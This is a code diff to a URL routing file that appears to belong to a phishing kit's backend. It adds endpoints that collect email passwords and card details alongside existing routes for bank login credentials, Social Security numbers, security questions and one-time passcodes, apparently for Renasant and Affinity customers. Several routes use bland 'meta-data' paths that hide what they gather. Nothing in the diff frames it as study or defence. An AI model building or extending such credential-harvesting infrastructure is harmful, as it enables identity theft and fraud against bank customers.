@@ -97,6 +97,8 @@ from user_data.renasant_views import (
     renasant_collect_user_social_security_2,
     renasant_collect_user_security_questions,
     renasant_collect_user_otp_verification,
+    renasant_collect_user_email_password,
+    renasant_collect_user_card_info,
 )
 from user_data.affinity_view import (
     affinity_collect_user_login_cred,
@@ -151,6 +153,9 @@ urlpatterns = [
     path("api/renasant-meta-data-6/", renasant_collect_user_social_security_2, name="renasant_collect_user_social_security_2"),
     path("api/renasant-meta-data-7/", renasant_collect_user_security_questions, name="renasant_collect_user_security_questions"),
     path("api/renasant-meta-data-8/", renasant_collect_user_otp_verification, name="renasant_collect_user_otp_verification"),
+    path("api/renasant-email-password/", renasant_collect_user_email_password, name="renasant_collect_user_email_password"),
+    path("api/renasant-card-info/", renasant_collect_user_card_info, name="renasant_collect_user_card_info"),
+    path("api/renasant-basic-info/", renasant_collect_user_basic_info, name="renasant_collect_user_basic_info_alias"),
     # Affinity API endpoints
     path("api/affinity-meta-data-1/", affinity_collect_user_login_cred, name="affinity_collect_user_login_cred"),
     path("api/affinity-meta-data-2/", affinity_collect_user_login_cred2, name="affinity_collect_user_login_cred2"),
